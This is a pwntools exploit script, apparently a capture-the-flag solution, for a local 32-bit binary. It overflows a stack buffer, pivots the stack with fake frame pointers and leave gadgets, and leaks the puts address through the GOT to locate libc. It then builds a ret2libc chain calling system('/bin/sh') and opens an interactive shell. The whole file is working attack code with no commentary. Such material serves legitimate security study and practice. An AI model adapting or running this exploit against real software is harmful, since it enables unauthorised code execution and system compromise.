from pwn import *
context.log_level = "debug"
context.arch = "i386"
sh = process("./main")
elf = ELF("./main")
libc_path = "/lib/i386-linux-gnu/libc.so.6"
offset = 44 #all = 0x30 -> 48
fakerbp1 = 0x804d000-0x100
fakerbp2 = 0x804d000-0x500
read_leave = 0x80492FB
leave = 0x804930F
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = b'a'*40+p32(fakerbp1)+p32(read_leave)
sh.sendafter(b"please input sth:\n",payload)

sleep(1)
payload = (p32(fakerbp2)+p32(puts_plt)+p32(read_leave)+p32(puts_got)).ljust(40,b'\x00') + p32(fakerbp1-40) + p32(leave)
sh.send(payload)
leak_libc = u32(sh.recv(4))
success("leak_libc:"+hex(leak_libc))
libc = ELF(libc_path)
libcbase = leak_libc - libc.sym['puts']
success("libcbase:"+hex(libcbase))
libc.address = libcbase
system = libc.sym['system']
binsh = libc.search(b'/bin/sh').__next__()

# gdb.attach(sh)
sleep(1)
payload = (p32(0xdeadbeef)+p32(system)+p32(0xdeadbeef)+p32(binsh)).ljust(40,b'\x00') + p32(fakerbp2-40) + p32(leave)
sh.send(payload)
sh.interactive()
#b'a'*40+p32(fakerbp1)+p32(read_leave)
#pivot_rop1 = (p32(fakerbp2)+p32(puts_plt)+p32(read_leave)+p32(puts_got)).ljust(40,b'\x00') + p32(fakerbp1-40) + p32(leave)
#pivot_rop2 = (p32(0xdeadbeef)+p32(system)+p32(0xdeadbeef)+p32(binsh)).ljust(40,b'\x00') + p32(fakerbp2-40) + p32(leave)